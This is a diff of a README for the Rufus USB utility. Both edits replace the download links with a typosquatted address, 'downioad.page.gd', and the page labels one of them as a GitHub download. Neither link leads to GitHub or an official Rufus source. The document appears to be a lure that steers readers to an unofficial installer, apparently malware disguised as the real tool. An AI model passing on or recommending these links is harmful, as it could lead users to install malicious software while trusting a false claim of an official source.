@@ -2,7 +2,7 @@
 
 Rufus is a powerful and lightweight utility designed to help users create bootable USB drives quickly and efficiently. In 2026, it remains a top choice for IT professionals and enthusiasts who need reliable installation media for Windows and other operating systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## About Rufus
 
@@ -56,7 +56,7 @@ To run Rufus smoothly in 2026, ensure your system meets these specifications:
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
